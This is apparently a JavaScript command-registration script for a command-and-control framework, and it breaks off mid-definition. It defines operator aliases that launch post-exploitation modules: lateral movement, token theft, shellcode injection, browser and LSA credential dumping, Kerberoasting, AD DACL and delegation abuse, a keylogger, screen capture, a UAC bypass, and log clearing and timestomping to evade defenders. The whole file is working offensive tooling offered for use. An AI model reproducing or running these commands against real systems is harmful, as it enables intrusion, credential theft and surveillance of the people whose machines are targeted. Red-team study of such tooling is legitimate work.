cmd_lnkgenerator.addArgString("description", "Shortcut description", "");
cmd_lnkgenerator.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [
        parsed_json["lnk"], parsed_json["target"], parsed_json["arguments"],
        parsed_json["workdir"], parsed_json["description"]
    ]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "lnkgenerator")}" ${params}`, "BOF: lnkgenerator");
});

var cmd_executesession = ax.create_command("bof-executesession", "Launch a process in another session via WTS token", "bof-executesession 2 C:\\Windows\\System32\\cmd.exe");
cmd_executesession.addArgInt("session", true, "Target session ID");
cmd_executesession.addArgString("command", true, "Command line");
cmd_executesession.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int,cstr", [parsed_json["session"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "executesession")}" ${params}`, "BOF: executesession");
});

/* ---- Tier 1 catalog aliases ---------------------------------------- */

var cmd_startwebclient = ax.create_command("bof-startwebclient", "Start the WebClient (WebDAV) service", "bof-startwebclient");
cmd_startwebclient.setPreHook(function (id, cmdline) {
    let params = ax.bof_pack("cstr,cstr,cstr", ["start", "WebClient", ""]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svcctl")}" ${params}`, "BOF: svcctl start");
});

var cmd_enumhandles_alias = ax.create_command("bof-EnumHandles", "Per-process handle counts (alias of bof-enumhandles)", "bof-EnumHandles");
cmd_enumhandles_alias.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumhandles")}"`, "BOF: enumhandles");
});

var cmd_processhandles_alias = ax.create_command("bof-ProcessListHandles", "List handles in a process (alias of bof-processhandles)", "bof-ProcessListHandles 1234");
cmd_processhandles_alias.addArgInt("pid", true, "Process ID");
cmd_processhandles_alias.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "processhandles")}" ${params}`, "BOF: processhandles");
});

var cmd_adcs_enum_com = ax.create_command("bof-adcs_enum_com", "Enumerate ADCS CAs and templates (alias)", "bof-adcs_enum_com all");
cmd_adcs_enum_com.addArgString("mode", "all, templates, services or ca", "all");
cmd_adcs_enum_com.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
});

var cmd_adcs_enum_com2 = ax.create_command("bof-adcs_enum_com2", "Enumerate ADCS CAs and templates (alias)", "bof-adcs_enum_com2 templates");
cmd_adcs_enum_com2.addArgString("mode", "all, templates, services or ca", "all");
cmd_adcs_enum_com2.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
});

var cmd_dllhijack = ax.create_command("bof-dllhijack", "Find service DLL/path search-order hijack candidates", "bof-dllhijack all");
cmd_dllhijack.addArgString("mode", "services, appinit or all", "services");
cmd_dllhijack.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dllhijack")}" ${params}`, "BOF: dllhijack");
});

/* ------------------------------------------------------------------ */
/* Lateral movement                                                    */
/* ------------------------------------------------------------------ */

var cmd_smbexec = ax.create_command("bof-smbexec", "Remote command execution via temporary SCM service", "bof-smbexec DC01 \"whoami > C:\\Windows\\Temp\\out.txt\"");
cmd_smbexec.addArgString("host", true, "Target host");
cmd_smbexec.addArgString("command", true, "Command line to run");
cmd_smbexec.addArgString("service", "Service name", "bofsmbexec");
cmd_smbexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["host"], parsed_json["command"], parsed_json["service"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "smbexec")}" ${params}`, "BOF: smbexec");
});

var cmd_wmiexec = ax.create_command("bof-wmiexec", "Remote execution through Win32_Process::Create", "bof-wmiexec DC01 \"cmd.exe /c whoami\"");
cmd_wmiexec.addArgString("host", true, "Target host or . for local");
cmd_wmiexec.addArgString("command", true, "Command line to run");
cmd_wmiexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["host"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wmiexec")}" ${params}`, "BOF: wmiexec");
});

var cmd_dcomexec = ax.create_command("bof-dcomexec", "Remote execution through the Shell.Application DCOM object", "bof-dcomexec DC01 cmd.exe \"/c whoami\"");
cmd_dcomexec.addArgString("host", true, "Target host");
cmd_dcomexec.addArgString("command", true, "Executable to launch");
cmd_dcomexec.addArgString("args", "Arguments for the executable", "");
cmd_dcomexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["host"], parsed_json["command"], parsed_json["args"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dcomexec")}" ${params}`, "BOF: dcomexec");
});

var cmd_scshell = ax.create_command("bof-scshell", "Fileless execution by reconfiguring an existing service", "bof-scshell DC01 Browser \"cmd.exe /c whoami\"");
cmd_scshell.addArgString("host", true, "Target host or . for local");
cmd_scshell.addArgString("service", true, "Existing service name");
cmd_scshell.addArgString("command", true, "Command line to run");
cmd_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["host"], parsed_json["service"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "scshell")}" ${params}`, "BOF: scshell");
});

var cmd_winrm_exec = ax.create_command("bof-winrm-exec", "Remote execution over native WS-Man (WinHTTP)", "bof-winrm-exec DC01 \"whoami\"");
cmd_winrm_exec.addArgString("host", true, "Hostname, host:port or WS-Man URL");
cmd_winrm_exec.addArgString("command", true, "Command to run");
cmd_winrm_exec.addArgString("user", "Optional username", "");
cmd_winrm_exec.addArgString("password", "Optional password", "");
cmd_winrm_exec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", [parsed_json["host"], parsed_json["command"], parsed_json["user"], parsed_json["password"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "winrm-exec")}" ${params}`, "BOF: winrm-exec");
});

/* ------------------------------------------------------------------ */
/* Token / impersonation                                               */
/* ------------------------------------------------------------------ */

var cmd_maketoken = ax.create_command("bof-maketoken", "Create and impersonate a token from plaintext credentials", "bof-maketoken alice Passw0rd! CORP");
cmd_maketoken.addArgString("user", true, "Username");
cmd_maketoken.addArgString("password", true, "Plaintext password");
cmd_maketoken.addArgString("domain", "Domain or . for local", ".");
cmd_maketoken.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["user"], parsed_json["password"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "maketoken")}" ${params}`, "BOF: maketoken");
});

var cmd_stealtoken = ax.create_command("bof-stealtoken", "Duplicate and impersonate the token of a PID", "bof-stealtoken 1234");
cmd_stealtoken.addArgInt("pid", "Target process ID", 0);
cmd_stealtoken.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "stealtoken")}" ${params}`, "BOF: stealtoken");
});

var cmd_reverttoken = ax.create_command("bof-reverttoken", "Drop thread impersonation with RevertToSelf", "bof-reverttoken");
cmd_reverttoken.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "reverttoken")}"`, "BOF: reverttoken");
});

var cmd_listimpersonation = ax.create_command("bof-listimpersonation", "Show thread impersonation token and process primary token", "bof-listimpersonation");
cmd_listimpersonation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listimpersonation")}"`, "BOF: listimpersonation");
});

var cmd_getsystem_svc = ax.create_command("bof-getsystem-svc", "Named-pipe impersonation server, optionally self-coercing the spooler", "bof-getsystem-svc bof_getsystem 30 spoolss");
cmd_getsystem_svc.addArgString("pipe", "Named pipe name", "bof_getsystem");
cmd_getsystem_svc.addArgInt("timeout", "Seconds to wait for a client", 30);
cmd_getsystem_svc.addArgString("coerce", "spoolss to trigger the spooler, empty for passive", "");
cmd_getsystem_svc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,int,cstr", [parsed_json["pipe"], parsed_json["timeout"], parsed_json["coerce"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "getsystem-svc")}" ${params}`, "BOF: getsystem-svc");
});

/* ------------------------------------------------------------------ */
/* Process injection                                                   */
/* ------------------------------------------------------------------ */

var cmd_injectapc = ax.create_command("bof-injectapc", "Queue APC shellcode injection into a process", "bof-injectapc 1234 C:\\Windows\\Temp\\payload.bin");
cmd_injectapc.addArgInt("pid", "Target process ID", 0);
cmd_injectapc.addArgString("file", true, "Shellcode file");
cmd_injectapc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["file"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "injectapc")}" ${params}`, "BOF: injectapc");
});

var cmd_injectthread = ax.create_command("bof-injectthread", "Remote thread injection through NtCreateThreadEx", "bof-injectthread 1234 C:\\Windows\\Temp\\payload.bin");
cmd_injectthread.addArgInt("pid", "Target process ID", 0);
cmd_injectthread.addArgString("file", true, "Shellcode file");
cmd_injectthread.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["file"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "injectthread")}" ${params}`, "BOF: injectthread");
});

var cmd_earlybird = ax.create_command("bof-earlybird", "APC injection into a suspended process before entry point", "bof-earlybird C:\\Windows\\System32\\notepad.exe C:\\Windows\\Temp\\payload.bin");
cmd_earlybird.addArgString("exe", true, "Executable to spawn suspended");
cmd_earlybird.addArgString("file", true, "Shellcode file");
cmd_earlybird.addArgString("args", "Arguments for the executable", "");
cmd_earlybird.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["exe"], parsed_json["file"], parsed_json["args"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "earlybird")}" ${params}`, "BOF: earlybird");
});

var cmd_ghostwrite = ax.create_command("bof-ghostwrite", "Section-backed injection without WriteProcessMemory", "bof-ghostwrite 1234 C:\\Windows\\Temp\\payload.bin");
cmd_ghostwrite.addArgInt("pid", "Target process ID", 0);
cmd_ghostwrite.addArgString("file", true, "Shellcode file");
cmd_ghostwrite.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["file"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ghostwrite")}" ${params}`, "BOF: ghostwrite");
});

/* ------------------------------------------------------------------ */
/* Credential access                                                   */
/* ------------------------------------------------------------------ */

var cmd_vaultdump = ax.create_command("bof-vaultdump", "Enumerate Windows Vault containers and items", "bof-vaultdump");
cmd_vaultdump.addArgString("vault", "Vault GUID or schema name filter", "");
cmd_vaultdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["vault"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vaultdump")}" ${params}`, "BOF: vaultdump");
});

var cmd_dpapiblobdec = ax.create_command("bof-dpapiblobdec", "Decrypt a DPAPI blob (hex) in the current user context", "bof-dpapiblobdec 01000000d08c9ddf...");
cmd_dpapiblobdec.addArgString("blob", true, "DPAPI blob as hex");
cmd_dpapiblobdec.addArgString("entropy", "Optional entropy as hex", "");
cmd_dpapiblobdec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["blob"], parsed_json["entropy"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dpapiblobdec")}" ${params}`, "BOF: dpapiblobdec");
});

var cmd_chromecreds = ax.create_command("bof-chromecreds", "Read saved Chrome / Edge logins from Login Data", "bof-chromecreds all");
cmd_chromecreds.addArgString("browser", "chrome, edge or all", "all");
cmd_chromecreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["browser"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "chromecreds")}" ${params}`, "BOF: chromecreds");
});

var cmd_recentfiles = ax.create_command("bof-recentfiles", "Enumerate Recent LNKs and parse jump-list streams", "bof-recentfiles");
cmd_recentfiles.addArgString("directory", "Optional extra directory to list", "");
cmd_recentfiles.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["directory"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "recentfiles")}" ${params}`, "BOF: recentfiles");
});

var cmd_sshagentkeys = ax.create_command("bof-sshagentkeys", "List identities held by the running OpenSSH agent", "bof-sshagentkeys");
cmd_sshagentkeys.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "sshagentkeys")}"`, "BOF: sshagentkeys");
});

/* ------------------------------------------------------------------ */
/* Defense evasion                                                     */
/* ------------------------------------------------------------------ */

var cmd_ppidspoof = ax.create_command("bof-ppidspoof", "Spawn a process with a spoofed parent PID", "bof-ppidspoof 1234 C:\\Windows\\System32\\cmd.exe");
cmd_ppidspoof.addArgInt("ppid", "Parent process ID", 0);
cmd_ppidspoof.addArgString("command", true, "Executable to spawn");
cmd_ppidspoof.addArgString("args", "Optional arguments", "");
cmd_ppidspoof.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int,cstr,cstr", [parsed_json["ppid"], parsed_json["command"], parsed_json["args"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ppidspoof")}" ${params}`, "BOF: ppidspoof");
});

var cmd_blockdlls = ax.create_command("bof-blockdlls", "Spawn a child with non-Microsoft DLL blocking", "bof-blockdlls C:\\Windows\\System32\\cmd.exe");
cmd_blockdlls.addArgString("command", true, "Executable to spawn");
cmd_blockdlls.addArgString("args", "Optional arguments", "");
cmd_blockdlls.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["command"], parsed_json["args"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "blockdlls")}" ${params}`, "BOF: blockdlls");
});

var cmd_acldeny = ax.create_command("bof-acldeny", "Add a deny ACE to a file or registry key DACL", "bof-acldeny file C:\\Windows\\Temp\\payload.exe S-1-5-32-545");
cmd_acldeny.addArgString("kind", true, "file, dir or reg");
cmd_acldeny.addArgString("path", true, "File path or registry key");
cmd_acldeny.addArgString("trustee", "SID or account name (default Everyone)", "S-1-1-0");
cmd_acldeny.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["kind"], parsed_json["path"], parsed_json["trustee"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "acldeny")}" ${params}`, "BOF: acldeny");
});

var cmd_timestomp = ax.create_command("bof-timestomp", "Overwrite file timestamps with SetFileTime", "bof-timestomp C:\\Windows\\Temp\\payload.exe \"2024-01-01 12:00:00\"");
cmd_timestomp.addArgString("path", true, "Target file");
cmd_timestomp.addArgString("timestamp", "Timestamp, empty for now, or copy", "");
cmd_timestomp.addArgString("source", "Source file for copy", "");
cmd_timestomp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["path"], parsed_json["timestamp"], parsed_json["source"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "timestomp")}" ${params}`, "BOF: timestomp");
});

var cmd_schtaskshide = ax.create_command("bof-schtaskshide", "Deny Users read access to a scheduled task", "bof-schtaskshide \\Microsoft\\Windows\\MyTask");
cmd_schtaskshide.addArgString("task", true, "Task path, e.g. \\Folder\\Name");
cmd_schtaskshide.addArgString("mode", "Empty to hide, restore to undo", "");
cmd_schtaskshide.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["task"], parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "schtaskshide")}" ${params}`, "BOF: schtaskshide");
});

/* ------------------------------------------------------------------ */
/* Recon / situational awareness (extended)                            */
/* ------------------------------------------------------------------ */

var cmd_screenspy = ax.create_command("bof-screenspy", "Repeated screenshot capture at a fixed interval", "bof-screenspy C:\\Windows\\Temp\\shots 5 5");
cmd_screenspy.addArgString("directory", "Output directory (empty = %TEMP%\\bof_screenspy)", "");
cmd_screenspy.addArgInt("interval", "Seconds between captures", 5);
cmd_screenspy.addArgInt("count", "Number of captures", 5);
cmd_screenspy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,int,int", [parsed_json["directory"], parsed_json["interval"], parsed_json["count"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "screenspy")}" ${params}`, "BOF: screenspy");
});

var cmd_keylogger = ax.create_command("bof-keylogger", "Low-level keyboard hook that flushes after N seconds", "bof-keylogger 30");
cmd_keylogger.addArgInt("seconds", "Capture duration", 30);
cmd_keylogger.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int", [parsed_json["seconds"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "keylogger")}" ${params}`, "BOF: keylogger");
});

var cmd_browserhist = ax.create_command("bof-browserhist", "Read recent Chrome / Edge history entries", "bof-browserhist all 50");
cmd_browserhist.addArgString("browser", "chrome, edge or all", "all");
cmd_browserhist.addArgInt("count", "Maximum entries", 50);
cmd_browserhist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,int", [parsed_json["browser"], parsed_json["count"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "browserhist")}" ${params}`, "BOF: browserhist");
});

var cmd_findcreds = ax.create_command("bof-findcreds", "Recursive filename hunt plus regex content grep", "bof-findcreds C:\\Users 6 \"(password|passwd)\\s*[:=]\"");
cmd_findcreds.addArgString("root", "Directory or file to scan (empty = %USERPROFILE%)", "");
cmd_findcreds.addArgInt("depth", "Maximum directory depth", 6);
cmd_findcreds.addArgString("regex", "Optional content regex (replaces built-in keywords)", "");
cmd_findcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,int,cstr", [parsed_json["root"], parsed_json["depth"], parsed_json["regex"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "findcreds")}" ${params}`, "BOF: findcreds");
});

/* ------------------------------------------------------------------ */
/* Active Directory / Kerberos                                        */
/* ------------------------------------------------------------------ */

var cmd_spnroast = ax.create_command("bof-spnroast", "Request Kerberoastable service tickets with SSPI", "bof-spnroast");
cmd_spnroast.addArgString("spn", "Optional single SPN to roast", "");
cmd_spnroast.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["spn"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "spnroast")}" ${params}`, "BOF: spnroast");
});

var cmd_asreproast = ax.create_command("bof-asreproast", "Find AS-REP roastable accounts (no pre-auth)", "bof-asreproast");
cmd_asreproast.addArgString("filter", "Optional sAMAccountName / UPN substring", "");
cmd_asreproast.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["filter"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "asreproast")}" ${params}`, "BOF: asreproast");
});

var cmd_gpocheck = ax.create_command("bof-gpocheck", "Enumerate GPOs, links and decrypt cpassword values", "bof-gpocheck");
cmd_gpocheck.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "gpocheck")}"`, "BOF: gpocheck");
});

var cmd_trustdump = ax.create_command("bof-trustdump", "Map domain trusts with DsEnumerateDomainTrusts", "bof-trustdump");
cmd_trustdump.addArgString("domain", "Domain to query (empty = local)", "");
cmd_trustdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "trustdump")}" ${params}`, "BOF: trustdump");
});

/* ------------------------------------------------------------------ */
/* Utility / OPSEC housekeeping                                       */
/* ------------------------------------------------------------------ */

var cmd_selfdelete = ax.create_command("bof-selfdelete", "Delete the agent image on reboot or via a helper", "bof-selfdelete reboot");
cmd_selfdelete.addArgString("mode", "reboot, force or empty", "");
cmd_selfdelete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "selfdelete")}" ${params}`, "BOF: selfdelete");
});

var cmd_prefetchdel = ax.create_command("bof-prefetchdel", "Delete prefetch entries for a binary", "bof-prefetchdel mimikatz.exe");
cmd_prefetchdel.addArgString("name", true, "Binary name or full path");
cmd_prefetchdel.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["name"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "prefetchdel")}" ${params}`, "BOF: prefetchdel");
});

var cmd_threadhide = ax.create_command("bof-threadhide", "Hide the current thread from debuggers", "bof-threadhide");
cmd_threadhide.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "threadhide")}"`, "BOF: threadhide");
});

var cmd_clearmplog = ax.create_command("bof-clearmplog", "Clear Windows Defender event logs", "bof-clearmplog all");
cmd_clearmplog.addArgString("channel", "Channel name, all, or empty for Defender/Operational", "");
cmd_clearmplog.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["channel"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "clearmplog")}" ${params}`, "BOF: clearmplog");
});

/* ------------------------------------------------------------------ */
/* AD ACL / credential primitives (extended)                           */
/* ------------------------------------------------------------------ */

var cmd_dacledit = ax.create_command("bof-dacledit", "Edit an AD object DACL (dcsync/genericall/writeowner/remove)", "bof-dacledit WS01$ ATTACKER$ dcsync");
cmd_dacledit.addArgString("target", true, "Target DN or sAMAccountName");
cmd_dacledit.addArgString("trustee", true, "Trustee DN, account or SID");
cmd_dacledit.addArgString("mode", "dcsync, genericall, writeowner or remove", "dcsync");
cmd_dacledit.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["target"], parsed_json["trustee"], parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dacledit")}" ${params}`, "BOF: dacledit");
});

var cmd_shadowcred = ax.create_command("bof-shadowcred", "Write msDS-KeyCredentialLink shadow credentials", "bof-shadowcred WS01$");
cmd_shadowcred.addArgString("target", true, "Target DN or sAMAccountName");
cmd_shadowcred.addArgString("blob", "Prebuilt KeyCredential blob (hex/base64), remove, or empty to generate", "");
cmd_shadowcred.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["target"], parsed_json["blob"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "shadowcred")}" ${params}`, "BOF: shadowcred");
});

var cmd_rbcd = ax.create_command("bof-rbcd", "Configure resource-based constrained delegation", "bof-rbcd WS01$ ATTACKER$");
cmd_rbcd.addArgString("target", true, "Target computer account");
cmd_rbcd.addArgString("trustee", "Trustee account or remove", "");
cmd_rbcd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["target"], parsed_json["trustee"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "rbcd")}" ${params}`, "BOF: rbcd");
});

var cmd_dnsdump = ax.create_command("bof-dnsdump", "Dump AD-integrated DNS records over LDAP", "bof-dnsdump");
cmd_dnsdump.addArgString("nc", "Optional naming context override", "");
cmd_dnsdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["nc"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dnsdump")}" ${params}`, "BOF: dnsdump");
});

var cmd_groupmanagedpw = ax.create_command("bof-groupmanagedpw", "Read a gMSA password and derive its NTLM hash", "bof-groupmanagedpw svc_sql$");
cmd_groupmanagedpw.addArgString("account", true, "gMSA sAMAccountName or DN");
cmd_groupmanagedpw.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["account"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "groupmanagedpw")}" ${params}`, "BOF: groupmanagedpw");
});

/* ------------------------------------------------------------------ */
/* Credential access (extended)                                        */
/* ------------------------------------------------------------------ */

var cmd_lsasecrets = ax.create_command("bof-lsasecrets", "Enumerate and decrypt LSA secret slots", "bof-lsasecrets");
cmd_lsasecrets.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "lsasecrets")}"`, "BOF: lsasecrets");
});

var cmd_dpapimasterkey = ax.create_command("bof-dpapimasterkey", "Decrypt a user DPAPI masterkey with its password", "bof-dpapimasterkey C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-... S-1-5-21-... Passw0rd!");
cmd_dpapimasterkey.addArgString("path", true, "Masterkey file or Protect directory");
cmd_dpapimasterkey.addArgString("sid", true, "User SID");
cmd_dpapimasterkey.addArgString("password", "User plaintext password", "");
cmd_dpapimasterkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["path"], parsed_json["sid"], parsed_json["password"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dpapimasterkey")}" ${params}`, "BOF: dpapimasterkey");
});

var cmd_vaultdump_full = ax.create_command("bof-vaultdump-full", "Retrieve Windows Vault items including authenticators", "bof-vaultdump-full");
cmd_vaultdump_full.addArgString("vault", "Vault GUID or schema name filter", "");
cmd_vaultdump_full.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["vault"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vaultdump-full")}" ${params}`, "BOF: vaultdump-full");
});

var cmd_chromecreds_abe = ax.create_command("bof-chromecreds-abe", "Chrome/Edge login extraction with App-Bound Encryption", "bof-chromecreds-abe all");
cmd_chromecreds_abe.addArgString("browser", "chrome, edge or all", "all");
cmd_chromecreds_abe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["browser"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "chromecreds-abe")}" ${params}`, "BOF: chromecreds-abe");
});

/* ------------------------------------------------------------------ */
/* Escalation / persistence / evasion (extended)                       */
/* ------------------------------------------------------------------ */

var cmd_uacbypass = ax.create_command("bof-uacbypass", "HKCU ms-settings auto-elevation UAC bypass", "bof-uacbypass \"cmd.exe /c whoami > C:\\Windows\\Temp\\uac.txt\"");
cmd_uacbypass.addArgString("command", true, "Payload command line");
cmd_uacbypass.addArgString("method", "fodhelper or computerdefaults", "fodhelper");
cmd_uacbypass.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["command"], parsed_json["method"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "uacbypass")}" ${params}`, "BOF: uacbypass");
});

var cmd_printspoofer = ax.create_command("bof-printspoofer", "SpoolSS coercion plus named-pipe SYSTEM impersonation", "bof-printspoofer \"cmd.exe /c whoami\"");
cmd_printspoofer.addArgString("command", "Command to run as SYSTEM (empty to only report the token)", "");
cmd_printspoofer.addArgString("pipe", "Named pipe name", "bof_spool");
cmd_printspoofer.addArgInt("timeout", "Seconds to wait for the spooler", 20);
cmd_printspoofer.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,int", [parsed_json["command"], parsed_json["pipe"], parsed_json["timeout"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "printspoofer")}" ${params}`, "BOF: printspoofer");
});

var cmd_wmisubscription = ax.create_command("bof-wmisubscription", "Create or remove a permanent WMI event subscription", "bof-wmisubscription Updater \"cmd.exe /c calc.exe\"");
